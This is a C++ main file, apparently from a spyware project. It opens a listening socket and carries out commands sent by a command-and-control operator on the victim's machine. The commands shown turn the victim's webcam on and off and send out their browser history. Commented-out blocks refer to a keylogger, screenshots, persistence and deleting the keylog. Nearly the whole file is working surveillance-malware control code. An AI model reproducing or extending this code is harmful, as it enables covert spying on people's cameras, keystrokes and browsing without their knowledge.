#pragma once
#include "Communicator.h"
#include "Spyware.h"

#pragma comment(lib, "ws2_32.lib")

queue<string> parseCommands(string commands);
void resetClient(SOCKET *soc);

int main(void)
{
	Spyware spy;
	std::queue<std::string> commands;
	string command;
	
	// configure socket
	SOCKET server_soc = Communicator::TCP::createSocket();
	Communicator::TCP::bindAndListen(server_soc, COMMAND_LISTEN_PORT);

	while (true)
	{
		// Wait for Command & Control connection
		SOCKET client_soc = Communicator::TCP::acceptClient(server_soc);

		// Can only have one Command & Control server connected at the same time.
		while (INVALID_SOCKET != client_soc)
		{
			// Receive commands to execute on target and parse them
			commands = parseCommands(Communicator::TCP::recvFromClient(client_soc).getData());

			// Execute instructions
			while (!commands.empty())
			{
				command = commands.front();

				cout << command << endl;
				if (command.compare("camera=on") == 0)
				{
					spy.camera.TurnOn();
				}
				else if (command.compare("camera=off") == 0)
				{
					spy.camera.TurnOff();
				}
				else if (command.compare("get history") == 0)
				{
					thread(&HistoryBrowser::sendHistory, spy.browser).join();
					//spy.browser.sendHistory();
				}
				else if (command.compare("end signal") == 0)
				{
					resetClient(&client_soc);
					break;
				}

				commands.pop();
			}
		}
	}
	
	system("PAUSE");
	return 0;
}

queue<string> parseCommands(string commands)
{
	queue<string> command_queue;
	size_t found = commands.find(COMMANDS_SEPERATOR);
	size_t prev = 0;
	while (found != string::npos)
	{
		command_queue.push(commands.substr(prev, found));
		prev = found + 1;
		found = commands.find(COMMANDS_SEPERATOR, prev);
	}

	return command_queue;
}

void resetClient(SOCKET *soc)
{
	*soc = Communicator::TCP::destroySocket(*soc);
}

/*

spy.browser.GetHistory();

spy.keylogger.Activate();
spy.keylogger.Deactivate();

spy.screenshot.TakeShot();

spy.Persist();
*/

/*
HistoryBrowser browser;
vector<unsigned char> history = browser.GetHistory();

ofstream database("History.db", std::ios::binary);
copy(history.begin(), history.end(), ostream_iterator<char>(database));

Keylogger keylogger;

keylogger.Activate();
Sleep(5000);
keylogger.Deactivate();
keylogger.DeleteLog();

ScreenshotInterface screenshot;
screenshot.TakeShot();

*/
